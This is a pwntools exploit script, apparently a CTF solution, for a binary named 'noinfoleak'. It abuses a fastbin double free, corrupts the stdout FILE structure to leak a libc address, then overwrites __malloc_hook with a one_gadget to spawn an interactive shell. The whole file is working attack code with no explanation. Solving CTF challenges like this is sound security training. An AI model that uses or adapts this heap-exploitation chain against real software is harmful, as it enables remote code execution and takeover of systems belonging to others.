from pwn import *

p = process('./noinfoleak')
#p = remote('ctf1.linkedbyx.com',10476)
elf = ELF('./noinfoleak')
libc = ELF('./libc6.so')
context.log_level = 'debug'

def create(size,content):
    p.sendlineafter('>','1')
    p.sendlineafter('>',str(size))
    p.sendafter('>',content)

def delete(index):
    p.sendlineafter('>','2')
    p.sendlineafter('>',str(index))

def edit(index,content):
    p.sendlineafter('>','3')
    p.sendlineafter('>',str(index))
    p.sendafter('>',content)

create(0x7f,'A'*0x20) #0
create(0x60,'A'*0x20) #1
create(0x60,'A')      #2
delete(0)
create(0x60,'A')      #3

delete(2)
delete(1)
delete(2)
gdb.attach(p)

create(0x60,'\x00')#4
create(0x60,'A')#5
create(0x60,'\x00')#6

edit(3,'\xdd\x45')
create(0x60,'A')

payload = 'A'*0x33 + p64(0xfbad1800) + p64(0x7f734fa446a3)*3
payload += '\x50'
create(0x65,payload)

p.sendline()
libc_base = u64(p.recv(6).ljust(8,'\x00'))
libc_base = libc_base - 3954339
print hex(libc_base)
malloc_addr = libc_base + libc.symbols['__malloc_hook']
one_gadget_addr = libc_base + 0xf02a4
log.success('malloc_addr :'+hex(malloc_addr))
log.success('one_addr :'+hex(one_gadget_addr))

delete(2)
delete(1)
delete(2)
create(0x60,p64(malloc_addr-35))
create(0x60,'A')
create(0x60,p64(malloc_addr-35))
create(0x60,'\x00'*19+p64(one_gadget_addr))
#gdb.attach(p)

p.sendlineafter('>','1')
p.sendlineafter('>',str(0x10))

p.interactive()
